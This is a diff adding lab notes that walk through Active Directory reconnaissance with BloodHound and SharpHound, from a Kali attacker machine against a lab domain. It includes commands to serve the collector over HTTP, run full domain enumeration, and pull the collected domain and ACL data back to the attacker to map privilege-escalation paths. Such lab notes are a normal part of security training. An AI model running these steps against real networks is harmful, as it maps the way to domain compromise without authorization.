@@ -1,0 +1,55 @@
+# Environment
+- Windows Server 2019 (Domain Controller)
+- Windows 10 (Domain Joined)
+- Kali Linux (Attacker Machine)
+
+-----------------------------------------
+1. Start Neo4j for BloodHound
+-----------------------------------------
+sudo neo4j console
+# Starts the Neo4j database service
+
+-----------------------------------------
+2. Launch BloodHound GUI
+-----------------------------------------
+bloodhound
+# Opens the BloodHound interface on Kali
+# Login using Neo4j credentials
+
+-----------------------------------------
+3. Transfer SharpHound.exe to Windows Machine
+-----------------------------------------
+# On Kali (host SharpHound.exe for download)
+cd ~/Tools/BloodHound/Collectors
+python3 -m http.server 80
+
+# On Windows
+# Open browser → navigate to:
+http://<KALI_IP>:80
+# Download 'SharpHound.exe' via browser
+
+-----------------------------------------
+4. Collect Active Directory Data
+-----------------------------------------
+.\SharpHound.exe -c All
+# Full AD enumeration
+# A ZIP file gets generated containing domain & ACL data
+
+-----------------------------------------
+5. Transfer Collected ZIP from Windows → Kali (reverse flow)
+-----------------------------------------
+# On Windows (host the ZIP for download)
+cd C:\Users\Public\Documents
+python3 -m http.server 8080
+# This exposes the collected BloodHound ZIP over HTTP
+
+# On Kali
+# Open browser → navigate to:
+http://<WINDOWS_IP>:8080
+# Download the ZIP manually via browser (no terminal commands)
+
+-----------------------------------------
+6. Import the ZIP into BloodHound for Mapping
+-----------------------------------------
+# In BloodHound → Upload Data → Select the downloaded ZIP
+# Graph reveals attack paths, privilege escalation, and high-value targets
